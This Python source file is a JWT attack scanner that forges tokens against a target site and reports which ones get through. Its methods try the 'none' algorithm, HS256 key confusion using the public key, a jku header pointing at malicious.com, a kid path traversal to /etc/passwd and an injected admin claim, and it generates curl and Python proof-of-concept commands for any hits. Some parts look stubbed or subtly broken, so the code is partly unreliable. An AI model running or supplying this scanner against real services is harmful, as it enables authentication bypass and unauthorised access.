import requests
import jwt
import json
import time
from typing import Dict, List, Tuple, Any

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
]

class JWTConfusionScanner:
    def __init__(self, target_url, cookie_name, auth_header, token, public_key_path, custom_payloads, verification_endpoint, verification_strings, verbose, delay):
        self.target_url = target_url
        self.cookie_name = cookie_name
        self.auth_header = auth_header
        self.token = token
        self.public_key = self._load_public_key(public_key_path) if public_key_path else None
        self.custom_payloads = custom_payloads
        self.verification_endpoint = verification_endpoint
        self.success_indicators = verification_strings.get('success', [])
        self.failure_indicators = verification_strings.get('failure', [])
        self.verbose = verbose
        self.delay = delay
        self.session = requests.Session()
        self._attack_responses = []

    def _load_public_key(self, path):
        with open(path, 'r') as f:
            return f.read()

    def _calculate_similarity(self, response1, response2):
        return 1.0 if response1 == response2 else 0.0

    def _check_indicator_in_context(self, html_content, indicator):
        return indicator in html_content

    def _create_token(self, header, payload, key):
        return jwt.encode(payload, key, algorithm=header.get('alg', 'none'), headers=header)

    def _decode_jwt(self, token):
        header, payload, signature = token.split('.')
        return (json.loads(jwt.utils.base64url_decode(header).decode()), json.loads(jwt.utils.base64url_decode(payload).decode()), signature)

    def _encode_jwt_part(self, part):
        return jwt.utils.base64url_encode(json.dumps(part).encode()).decode()

    def _establish_baselines(self, orig_token):
        self.baseline_valid_response = self._make_request(orig_token)
        self.baseline_invalid_response = self._make_request(self._create_token({"alg": "none"}, {}, ""))

    def _evaluate_response(self, response, attack_type):
        return {
            "attack_type": attack_type,
            "status_code": response.status_code,
            "content_length": len(response.content),
            "success": any(indicator in response.text for indicator in self.success_indicators),
            "failure": any(indicator in response.text for indicator in self.failure_indicators)
        }

    def _extract_interesting_content(self, html_content):
        return html_content[:200]

    def _generate_curl_poc(self, endpoint, token, cookie_name):
        return f"curl -s -k -i -H 'Authorization: Bearer {token}' {endpoint}"

    def _generate_poc(self, vuln):
        return {
            "curl_command": self._generate_curl_poc(self.target_url, vuln['token'], self.cookie_name),
            "description": vuln['description']
        }

    def _generate_python_poc(self, endpoint, token, cookie_name):
        return f"""
import requests

url = "{endpoint}"
headers = {{
    "Authorization": "Bearer {token}"
}}

response = requests.get(url, headers=headers)
print(response.text)
"""

    def _get_original_token(self):
        if self.token:
            return self.token
        response = self.session.get(self.target_url)
        return response.cookies.get(self.cookie_name) if self.cookie_name else response.headers.get('Authorization').split()[1]

    def _is_jwt(self, token):
        return len(token.split('.')) == 3

    def _make_request(self, token):
        headers = {"Authorization": f"Bearer {token}"} if self.auth_header else {}
        cookies = {self.cookie_name: token} if self.cookie_name else {}
        return self.session.get(self.target_url, headers=headers, cookies=cookies)

    def _print_verbose(self, message):
        if self.verbose:
            print(message)

    def _try_attack(self, attack_type, token, description):
        response = self._make_request(token)
        result = self._evaluate_response(response, attack_type)
        result['description'] = description
        result['token'] = token
        self._attack_responses.append(result)
        return result

    def _verify_authentication(self, token):
        response = self._make_request(token)
        return 1.0 if response.status_code == 200 else 0.0

    def scan(self):
        orig_token = self._get_original_token()
        self._establish_baselines(orig_token)
        results = []
        results.extend(self.test_alg_none({}, {}))
        results.extend(self.test_algorithm_substitution({}, {}, orig_token))
        results.extend(self.test_custom_payloads({}, {}))
        results.extend(self.test_jku_manipulation({}, {}, orig_token))
        results.extend(self.test_key_confusion({}, {}, orig_token))
        results.extend(self.test_kid_manipulation({}, {}, orig_token))
        results.extend(self.test_payload_manipulation({}, {}))
        return results

    def test_alg_none(self, header, payload):
        token = self._create_token({"alg": "none"}, payload, "")
        return [self._try_attack("alg_none", token, "Testing 'none' algorithm")]

    def test_algorithm_substitution(self, header, payload, orig_token):
        token = self._create_token({"alg": "HS256"}, payload, "secret")
        return [self._try_attack("alg_substitution", token, "Testing algorithm substitution")]

    def test_custom_payloads(self, header, payload):
        results = []
        for custom_payload in self.custom_payloads:
            token = self._create_token(header, custom_payload, "secret")
            results.append(self._try_attack("custom_payload", token, "Testing custom payload"))
        return results

    def test_jku_manipulation(self, header, payload, orig_token):
        header['jku'] = 'http://malicious.com/jwks.json'
        token = self._create_token(header, payload, "secret")
        return [self._try_attack("jku_manipulation", token, "Testing jku manipulation")]

    def test_key_confusion(self, header, payload, orig_token):
        token = self._create_token({"alg": "HS256"}, payload, self.public_key)
        return [self._try_attack("key_confusion", token, "Testing key confusion")]

    def test_kid_manipulation(self, header, payload, orig_token):
        header['kid'] = '../../../../etc/passwd'
        token = self._create_token(header, payload, "secret")
        return [self._try_attack("kid_manipulation", token, "Testing kid manipulation")]

    def test_payload_manipulation(self, header, payload):
        payload['admin'] = True
        token = self._create_token(header, payload, "secret")
        return [self._try_attack("payload_manipulation", token, "Testing payload manipulation")]

def main():
    # Example usage
    scanner = JWTConfusionScanner(
        target_url="http://example.com",
        cookie_name="jwt",
        auth_header=True,
        token=None,
        public_key_path="public.pem",
        custom_payloads=[{"role": "admin"}],
        verification_endpoint="http://example.com/verify",
        verification_strings={"success": ["Welcome, admin"], "failure": ["Access denied"]},
        verbose=True,
        delay=1
    )
    results = scanner.scan()
    print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()